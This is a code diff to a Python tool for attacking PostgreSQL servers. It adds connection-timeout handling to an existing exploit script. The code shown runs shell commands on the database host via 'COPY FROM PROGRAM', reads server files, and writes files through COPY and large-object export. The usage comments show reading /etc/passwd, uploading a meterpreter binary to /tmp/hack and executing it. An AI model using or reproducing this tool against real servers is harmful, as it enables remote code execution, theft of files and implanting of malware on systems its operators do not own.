@@ -22,10 +22,10 @@ def random_num(l):
         return str(random.randrange(1, 9)) + ''.join(str(random.randrange(0, 9)) for _ in range(l - 1))
 
 
-def connect():
+def connect(overtime=3):
     try:
         conn = psycopg2.connect(database=targetDB, user=targetUser, password=targetPass, host=target, port=targetPort,
-                                client_encoding=out_put_encode)
+                                client_encoding=out_put_encode, connect_timeout=overtime)
         # print("[+] Opened database successfully")
         return conn
     except:
@@ -33,7 +33,7 @@ def connect():
         exit(-1)
 
 
-def sql_query(conn, sql, output=True,output_err=False):
+def sql_query(conn, sql, output=True, output_err=False):
     cur = conn.cursor()
     # print(sql)
     cur.execute(sql)
@@ -42,7 +42,7 @@ def sql_query(conn, sql, output=True,output_err=False):
         rows = cur.fetchall()
         for item in rows:
             if output:
-                print(item[0])
+                print(repr(item[0])[1:-1])
     except Exception as e:
         if output_err:
             print(e)
@@ -72,14 +72,14 @@ def rce(cmd_to_go):
         "COPY %s FROM PROGRAM '%s';" % (random_table, cmd_to_go)
     ]
     for sql in commands:
-        sql_query(connect(), sql, output=False)
+        sql_query(connect(timeoutsec), sql, output=False)
 
     commands = [
         "SELECT * FROM %s;" % random_table,
         "DROP TABLE IF EXISTS %s;" % random_table
     ]
     for sql in commands:
-        sql_query(connect(), sql, output=True)
+        sql_query(connect(timeoutsec), sql, output=True)
 
 
 def file_read(target_file):
@@ -92,7 +92,7 @@ def file_read(target_file):
         "DROP TABLE IF EXISTS %s;" % random_table
     ]
     for sql in commands:
-        sql_query(connect(), sql, output=True)
+        sql_query(connect(timeoutsec), sql, output=True)
 
 
 def get_binary_base64(bdata):
@@ -105,7 +105,7 @@ def text_upload(text, dst):
     text = str(text)
     b64_data = get_binary_base64(text.encode())
     sql_Line = "COPY (select convert_from(decode('%s','base64'),'utf-8')) to '%s';" % (b64_data, dst)
-    sql_query(connect(), sql_Line, output=False)
+    sql_query(connect(timeoutsec), sql_Line, output=False)
     print("[+] Uploaded")
 
 
@@ -127,7 +127,7 @@ def bin_upload(src, dst):
         "SELECT lo_create(%i);" % random_oid
     ]
     for sql in commands:
-        sql_query(connect(), sql, output=False)
+        sql_query(connect(timeoutsec), sql, output=False)
 
     bin_chunk = bin_split(src, 2048)
     commands = []
@@ -137,9 +137,9 @@ def bin_upload(src, dst):
             random_oid, index, b64_chunk))
         index += 1
     for sql in tqdm(commands):
-        sql_query(connect(), sql, output=False, output_err=False)
-    sql_query(connect(), "SELECT lo_export(%i, '%s');" % (random_oid, dst), output=False)
-    sql_query(connect(), "SELECT lo_unlink(%i);" % (random_oid), output=False)
+        sql_query(connect(timeoutsec), sql, output=False, output_err=False)
+    sql_query(connect(timeoutsec), "SELECT lo_export(%i, '%s');" % (random_oid, dst), output=False)
+    sql_query(connect(timeoutsec), "SELECT lo_unlink(%i);" % (random_oid), output=False)
     print("[+] Uploaded")
 
 
@@ -156,6 +156,7 @@ parser.add_argument('-c', help='cmd to run')
 parser.add_argument('-s', help='src file to read')
 parser.add_argument('-t', help='target file to upload')
 parser.add_argument('-e', default="UTF8", help='Output encode: GBK, UTF8')
+parser.add_argument('--timeout', default=3, type=int, help='DB connect overtime, default 3s')
 args = parser.parse_args()
 
 target = args.host
@@ -168,6 +169,7 @@ command = args.c
 src_file = args.s
 dst_file = args.t
 out_put_encode = args.e
+timeoutsec = args.timeout
 
 if attack_mode == "rce" and not command:
     print("[!] 需要指定 -c 参数")
@@ -197,13 +199,13 @@ if attack_mode == "sql" and not command:
     print("[!] 需要指定 -c 参数")
     exit(-1)
 elif attack_mode == "sql" and command:
-    sql_query(connect(), command, output=True)
+    sql_query(connect(timeoutsec), command, output=True)
 
 # sql_query(connect(host=host, password=password), "show server_version;")
-# --host "192.168.163.154" -w "123456" -m "rce" -c "whoami" -e "GBK"
-# --host "192.168.163.149" -w "123456" -m "read" -s "/etc/passwd" -e "UTF8"
-# --host "192.168.163.149" -w "123456" -m "sql" -c "show server_version;" -e "UTF8"
-# --host "192.168.163.149" -w "123456" -m "text_upload" -s "this is test" -t "/tmp/1.txt"
-# --host "192.168.163.149" -w "123456" -m "bin_upload" -s "C:\Users\HP\Downloads\FOV 100-99-0-1-1693540851.zip" -t "/tmp/1.zip"
-# --host "192.168.163.149" -w "123456" -m "bin_upload" -s "C:\Users\HP\Desktop\白名单\meterpreter" -t "/tmp/hack"
-# --host "192.168.163.149" -w "123456" -m "rce" -c "chmod +x /tmp/hack;/tmp/hack" -e "UTF8"
+# python main.py --host "192.168.163.156" -w "123456" -m "rce" -c "whoami" -e "GBK"
+# python main.py --host "192.168.163.149" -w "123456" -m "read" -s "/etc/passwd" -e "UTF8"
+# python main.py --host "192.168.163.149" -w "123456" -m "sql" -c "show server_version;" -e "UTF8"
+# python main.py --host "192.168.163.149" -w "123456" -m "text_upload" -s "this is test" -t "/tmp/1.txt"
+# python main.py --host "192.168.163.149" -w "123456" -m "bin_upload" -s "C:\Users\HP\Downloads\FOV 100-99-0-1-1693540851.zip" -t "/tmp/1.zip"
+# python main.py --host "192.168.163.149" -w "123456" -m "bin_upload" -s "C:\Users\HP\Desktop\白名单\meterpreter" -t "/tmp/hack"
+# python main.py --host "192.168.163.149" -w "123456" -m "rce" -c "chmod +x /tmp/hack;/tmp/hack" -e "UTF8"
